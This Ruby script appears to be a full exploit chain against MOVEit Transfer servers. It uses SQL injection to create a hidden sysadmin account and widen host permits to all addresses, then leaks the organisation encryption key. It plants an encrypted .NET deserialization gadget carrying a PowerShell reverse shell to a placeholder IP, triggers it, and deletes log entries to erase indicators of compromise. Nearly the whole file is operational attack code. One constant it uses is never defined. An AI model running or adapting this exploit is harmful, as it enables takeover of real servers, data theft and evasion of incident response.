require 'httparty'
require 'digest'
require 'openssl'

TARGET = "https://#{ARGV[0] || '10.0.0.193'}"
VERBOSE = true

HEADERS = [
  'X-siLock-AgentBrand', 'X-siLock-AgentVersion', 'X-siLock-CanAcceptCompress', 'X-siLock-CanAcceptLumps', 'X-siLock-CanCheckHash',
  'X-siLock-Challenge', 'X-siLock-CheckVirus', 'X-siLock-ClientType', 'X-siLock-CS2-Allow204', 'X-siLock-CS2-AVDLP',
  'X-siLock-CS2-BlockOnError', 'X-siLock-CS2-ChunkSizeKB', 'X-siLock-CS2-ConnTimeoutSecs', 'X-siLock-CS2-DoPreview', 'X-siLock-CS2-Engine',
  'X-siLock-CS2-Error', 'X-siLock-CS2-ISTag', 'X-siLock-CS2-MaxFileSize', 'X-siLock-CS2-Name', 'X-siLock-CS2-RecvTimeoutSecs',
  'X-siLock-CS2-SendTimeoutSecs', 'X-siLock-CS2-Tries', 'X-siLock-CS2-Type', 'X-siLock-CS2-URL', 'X-siLock-CS-Allow204',
  'X-siLock-CS-AVDLP', 'X-siLock-CS-BlockOnError', 'X-siLock-CS-ChunkSizeKB', 'X-siLock-CS-ConnTimeoutSecs', 'X-siLock-CS-DoPreview',
  'X-siLock-CS-Engine', 'X-siLock-CS-Error', 'X-siLock-CS-ISTag', 'X-siLock-CS-MaxFileSize', 'X-siLock-CS-Name',
  'X-siLock-CS-RecvTimeoutSecs', 'X-siLock-CSRFToken', 'X-siLock-CS-SendTimeoutSecs', 'X-siLock-CS-Tries', 'X-siLock-CS-URL',
  'X-siLock-DLPChecked', 'X-siLock-DLPViolation', 'X-siLock-DownloadToken', 'X-siLock-Duration', 'X-siLock-ErrorCode',
  'X-siLock-ErrorDescription', 'X-siLock-FileID', 'X-siLock-FileIDToDelete', 'X-siLock-FilePath', 'X-siLock-FileSize',
  'X-siLock-FolderID', 'X-siLock-FolderPath', 'X-siLock-FolderType', 'X-siLock-Hash', 'X-siLock-HashOK',
  'X-siLock-InstID', 'X-siLock-IntegrityVerified', 'X-siLock-IPAddress', 'X-siLock-LangCode', 'X-siLock-LoginName',
  'X-siLock-LogRecID', 'X-siLock-MailboxOwner', 'X-siLock-NotificationID', 'X-siLock-OriginalFilename', 'X-siLock-PackageID',
  'X-siLock-PartialFileID', 'X-siLock-PartialFilePath', 'X-siLock-Password', 'X-siLock-RealName', 'X-siLock-RelativePath',
  'X-siLock-ResumeInPlace', 'X-siLock-SessionID', 'X-siLock-SessVar', 'X-siLock-TimeBegun', 'X-siLock-TimeElapsed',
  'X-siLock-TimeEnded', 'X-siLock-Transaction', 'X-siLock-Untrusted', 'X-siLock-UploadComment', 'X-siLock-UserFilename',
  'X-siLock-Username', 'X-siLock-VirusChecked', 'X-siLock-XferFormat',
]

def log(msg)
  $stdout.puts("[+] #{msg}")
end

def rand_string(len)
  (0...len).map { (65 + rand(26)).chr }.join
end

module Net::HTTPHeader
  def capitalize(name)
    name = name.split(/-/).map { |s| s.capitalize }.join('-')
    HEADERS.each { |h| name = name.gsub(/#{h}/i, h) }
    name
  end
  private :capitalize
end

def get_csrf_token(response)
  if response.split(/\n/).join =~ /.*csrftoken" value="([a-f0-9]*)"/
    return $1
  else
    puts response if VERBOSE
    raise 'No CSRF token found, or my code is bad'
  end
end

def isapi_request(cookies, transaction, headers = {})
  HTTParty.get(
    "#{TARGET}/moveitisapi/moveitisapi.dll?action=m2",
    verify: false,
    headers: {
      'Cookie' => cookies,
      'X-siLock-Test': 'abcdX-SILOCK-Transaction: folder_add_by_path',
      'X-siLock-Transaction': transaction,
    }.merge(headers),
  )
end

def guestaccess_request(cookies, body)
  HTTParty.post(
    "#{TARGET}/guestaccess.aspx",
    verify: false,
    headers: {
      'Cookie' => cookies,
    },
    follow_redirects: false,
    body: body,
  )
end

def set_session(cookies, session_vars)
  session_vars.each_with_index do |(k, v), idx|
    log("Setting #{k} => #{v}") if VERBOSE
    headers = { "X-siLock-SessVar#{idx}": "#{k}: #{v}" }
    isapi_request(cookies, 'session_setvars', headers)
  end
end

def sqli(cookies, sql_payload)
  set_session(cookies, {
    'MyPkgAccessCode' => 'accesscode',
    'MyPkgID' => '0',
    'MyGuestEmailAddr' => MYGUESTEMAILADDR,
    'MyPkgInstID' => '1234',
    'MyPkgSelfProvisionedRecips' => sql_payload,
    'MyUsername' => 'Guest',
  })

  csrf = get_csrf_token(guestaccess_request(cookies, 'Transaction=dummy&Arg06=accesscode&Arg12=promptaccesscode'))
  log("CSRF token = #{csrf}") if VERBOSE

  guestaccess_request(cookies, "Arg06=accesscode&transaction=secmsgpost&Arg01=subject&Arg04=body&Arg05=sendauto&Arg09=pkgtest9&csrftoken=#{csrf}")
end

def get_sqli_payload(sql_payload)
  payload = ["#{rand_string(8)}@#{rand_string(8)}.com')"].concat(sql_payload)
  payload.join(';') + ';#'
end

def makev1password(password, salt = 'AAAA')
  raise "Password cannot be empty" if password.empty?
  raise "Salt must be 4 bytes" if salt.length != 4

  pwpre = Base64.decode64('=VT2jkEH3vAs=')
  pwpost = Base64.decode64('=0maaSIA5oy0=')

  md5 = Digest::MD5.new
  md5.update(pwpre)
  md5.update(salt)
  md5.update(password)
  md5.update(pwpost)

  pw = [(4 + 4 + 16), 0, 0, 0].pack('CCCC') + salt + md5.digest
  Base64.strict_encode64(pw).gsub('+', '-')
end

def moveitv2encrypt(data, org_key, iv = nil, tag = '@%!')

  raise "org_key must be 16 bytes" if org_key.length != 16

  iv ||= rand_string(4) * 4

  key = [64, 131, 232, 51, 134, 103, 230, 30, 48, 86, 253, 157].pack('C*') + org_key + [0, 0, 0, 0].pack('C*')

  cipher = OpenSSL::Cipher.new('AES-256-CBC')
  cipher.encrypt
  cipher.key = key
  cipher.iv = iv

  encrypted_data = cipher.update(data) + cipher.final

  data_sha1_hash = Digest::SHA1.digest(data).unpack('C*')
  org_key_sha1_hash = Digest::SHA1.digest(org_key).unpack('C*')

  header = [
    225, 0,
    data_sha1_hash[0], data_sha1_hash[1],
    org_key_sha1_hash[0], org_key_sha1_hash[1], org_key_sha1_hash[2], org_key_sha1_hash[3],
    iv.unpack('C*')[0], iv.unpack('C*')[1], iv.unpack('C*')[2], iv.unpack('C*')[3]
  ].pack('C*')

  tag + Base64.strict_encode64(header + encrypted_data)
end

log("Starting. target='#{TARGET}'.")

r = HTTParty.get("#{TARGET}/", verify: false)
cookies = r.get_fields('Set-Cookie')&.join('; ') || raise("Couldn't find cookies in the response!")

log("Cookies = #{cookies}") if VERBOSE

token = cookies[/ASP.NET_SessionId=([a-z0-9]+);/, 1] || raise("Couldn't find token from cookies!")
instid = cookies[/siLockLongTermInstID=([0-9]+);/, 1] || raise("Couldn't find InstID from cookies!")

log("Retrieved initial session token '#{token}' and InstID '#{instid}'.")

hax_username = rand_string(8)
hax_loginname = rand_string(8)
hax_password = rand_string(8)

createuser_payload = [
  "UPDATE moveittransfer.hostpermits SET Host='*.*.*.*' WHERE Host!='*.*.*.*'",
  "INSERT INTO moveittransfer.users (Username) VALUES ('#{hax_username}')",
  "UPDATE moveittransfer.users SET LoginName='#{hax_loginname}' WHERE Username='#{hax_username}'",
  "UPDATE moveittransfer.users SET InstID='#{instid}' WHERE Username='#{hax_username}'",
  "UPDATE moveittransfer.users SET Password='#{makev1password(hax_password, rand_string(4))}' WHERE Username='#{hax_username}'",
  "UPDATE moveittransfer.users SET Permission='40' WHERE Username='#{hax_username}'",
  "UPDATE moveittransfer.users SET CreateStamp=NOW() WHERE Username='#{hax_username}'",
]

log("Creating new sysadmin account: username='#{hax_username}', userlogin='#{hax_loginname}', password='#{hax_password}'.")
res = sqli(cookies, get_sqli_payload(createuser_payload))
raise "Couldn't perform initial SQLi (#{res.body})" if res.code != 200

token_response = HTTParty.post(
  "#{TARGET}/api/v1/token",
  verify: false,
  headers: { 'Content-Type' => 'application/x-www-form-urlencoded' },
  follow_redirects: false,
  body: "grant_type=password&username=#{hax_loginname}&password=#{hax_password}"
)

raise "Couldn't get API token (#{token_response.body})" if token_response.code != 200

token_json = JSON.parse(token_response.body)
log("Got API access token='#{token_json['access_token']}'.")

folders_response = HTTParty.get(
  "#{TARGET}/api/v1/folders",
  verify: false,
  headers: { 'Authorization' => "Bearer #{token_json['access_token']}" },
  follow_redirects: false,
)

raise "Couldn't get API folders (#{folders_response.body})" if folders_response.code != 200

folders_json = JSON.parse(folders_response.body)
log("Found folderId '#{folders_json['items'][0]['id']}'.")

uploadfile_name = rand_string(8)
uploadfile_size = 8
uploadfile_data = rand_string(uploadfile_size)

files_response = HTTParty.post(
  "#{TARGET}/api/v1/folders/#{folders_json['items'][0]['id']}/files?uploadType=resumable",
  verify: false,
  headers: { 'Authorization' => "Bearer #{token_json['access_token']}" },
  follow_redirects: false,
  multipart: true,
  body: { name: uploadfile_name, size: uploadfile_size.to_s, comments: '' }
)

raise "Couldn't post API files #1 (#{files_response.body})" if files_response.code != 200

files_json = JSON.parse(files_response.body)
log("Initiated resumable file upload for fileId '#{files_json['fileId']}'...")

haxleak_payload = [
  "UPDATE moveittransfer.files SET UploadAgentBrand=(SELECT PairValue FROM moveittransfer.registryaudit WHERE PairName='Key' AND CHAR_LENGTH(KeyName)=#{'Standard Networks\siLock\Institutions\0'.length}) WHERE ID='#{files_json['fileId']}'"
]

sqli(cookies, get_sqli_payload(haxleak_payload))

leak_response = HTTParty.get(
  "#{TARGET}/api/v1/files/#{files_json['fileId']}",
  verify: false,
  headers: { 'Authorization' => "Bearer #{token_json['access_token']}" },
  follow_redirects: false,
)

raise "Couldn't post API files #LEAK (#{leak_response.body})" if leak_response.code != 200

leak_json = JSON.parse(leak_response.body)
org_key = leak_json['uploadAgentBrand']
log("Leaked the Org Key: #{org_key}")

gadget = <<-EOF
AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAugU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLW5vcCAtYyAkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCdZb3VyX0lQJywyMjQ0NSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlNnt9O3doaWxlKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCkgLW5lIDApIHskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLCAwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgPSAkc2VuZGJhY2sgKyAnUFMgJyArIChwd2QpLlBhdGggKyAnPiAnOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKUdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLCAwLCAkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKSIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=
EOF

gadget.gsub!('YOUR_IP', 'YOUR_VPN_IP')
log("Using deserialization gadget: #{gadget}")

org_key.gsub!(' ', '')
org_key = [org_key].pack('H*').bytes.to_a.pack('C*')
deserialization_gadget = moveitv2encrypt(gadget, org_key)
log("Encrypted the gadget with Org Key: #{deserialization_gadget}")

haxupload_payload = [
  "UPDATE moveittransfer.fileuploadinfo SET State='#{deserialization_gadget}' WHERE FileID='#{files_json['fileId']}'"
]

log("Planting encrypted gadget into the DB...")
sqli(cookies, get_sqli_payload(haxupload_payload))

p "Uploading fileid #{files_json['fileId']} to folderid #{folders_json['items'][0]['id']}" if VERBOSE
log("Triggering gadget deserialization...")

files_response = HTTParty.put(
  "#{TARGET}/api/v1/folders/#{folders_json['items'][0]['id']}/files?uploadType=resumable&fileId=#{files_json['fileId']}",
  verify: false,
  headers: {
    'Authorization' => "Bearer #{token_json['access_token']}",
    'Content-Type' => "application/octet-stream",
    'Content-Range' => "bytes 0-#{uploadfile_size - 1}/#{uploadfile_size}",
    'X-File-Hash' => Digest::SHA1.hexdigest(uploadfile_data),
  },
  follow_redirects: false,
  body: uploadfile_data[0, uploadfile_data.length]
)

raise "Couldn't post API files #2 code=#{files_response.code} (#{files_response.body})" if files_response.code != 500
log("Gadget deserialized, RCE Achieved!")
p files_response.body if VERBOSE

deleteuser_payload = [
  "DELETE FROM moveittransfer.fileuploadinfo WHERE FileID='#{files_json['fileId']}'",
  "DELETE FROM moveittransfer.files WHERE UploadUsername='#{hax_username}'",
  "DELETE FROM moveittransfer.activesessions WHERE Username='#{hax_username}'",
  "DELETE FROM moveittransfer.users WHERE Username='#{hax_username}'",
  "DELETE FROM moveittransfer.log WHERE Username='#{hax_username}'",
  "DELETE FROM moveittransfer.log WHERE Username='#{hax_loginname}'",
  "DELETE FROM moveittransfer.log WHERE Username='Guest:#{MYGUESTEMAILADDR}'",
]

log("Deleting IoC's from the DB...")
sqli(cookies, get_sqli_payload(deleteuser_payload))

log("Finished.")
